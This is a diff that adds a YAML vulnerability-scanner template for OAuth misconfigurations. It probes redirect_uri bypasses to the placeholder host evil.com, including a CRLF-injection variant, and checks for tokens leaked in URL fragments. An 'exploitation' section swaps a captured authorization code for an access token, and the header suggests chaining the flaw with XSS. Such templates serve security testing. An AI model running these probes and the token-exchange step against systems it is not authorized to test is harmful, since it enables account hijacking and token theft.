@@ -1,0 +1,59 @@
+id: oauth-god
+name: OAuth Misconfiguration – God Level (Redirect Bypass + Code Leak)
+severity: medium
+impact: Attacker can intercept OAuth authorization codes and impersonate users.
+chain: Combine with XSS to steal tokens.
+
+requests:
+  # 1. Test redirect_uri bypass with open redirect
+  - method: GET
+    path:
+      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code"
+      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri={{BaseURL}}//evil.com&response_type=code"
+      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri={{BaseURL}}%0d%0a//evil.com&response_type=code"
+    matchers:
+      - type: status
+        status: 302
+      - type: word
+        part: header
+        words:
+          - "Location: https://evil.com"
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "error"
+
+  # 2. Test if OAuth code is returned in URL fragment (implicit flow)
+  - method: GET
+    path:
+      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri={{BaseURL}}/callback&response_type=token"
+    matchers:
+      - type: status
+        status: 302
+      - type: regex
+        part: header
+        regex:
+          - '#access_token='
+
+verification:
+  # Confirm that code is actually returned
+  - method: GET
+    path: "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri={{BaseURL}}/callback&response_type=code"
+    matchers:
+      - type: status
+        status: 302
+      - type: regex
+        part: header
+        regex:
+          - 'code='
+
+exploitation:
+  # Use the leaked code to get an access token (simulate)
+  - method: POST
+    path: "{{BaseURL}}/oauth/token"
+    body: |
+      client_id=test&client_secret=secret&code={{code}}&redirect_uri={{BaseURL}}/callback&grant_type=authorization_code
+    extract:
+      type: json
+      path: "$.access_token"
